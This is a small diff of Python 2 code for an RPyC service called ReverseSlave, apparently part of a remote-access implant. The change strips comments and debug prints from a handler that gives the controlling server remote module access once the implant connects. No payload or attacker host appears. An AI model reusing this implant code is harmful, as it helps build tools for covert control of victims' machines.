@@ -10,11 +10,8 @@ class ReverseSlave(Service):
    
     __slots__ = ["exposed_namespace"]
 
-    #http://rpyc.readthedocs.io/en/latest/_modules/rpyc/utils/classic.html
-    #http://nullege.com/codes/show/src@r@p@rpyc-op-3.2.1-openproximity@rpyc@core@service.py/148/rpyc.lib.compat.execute
     def on_connect(self):
         """ Set these attributes once implant connects to server. """
-        
         try:
             self.exposed_namespace = {}
             self._conn._config.update(dict(
@@ -30,8 +27,6 @@ class ReverseSlave(Service):
                 instantiate_custom_exceptions = True,
                 instantiate_oldstyle_exceptions = True,
             ))
-            print self.exposed_getmodule
-            print ModuleNamespace(self.exposed_getmodule)
             self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
         except Exception as e:
             print e
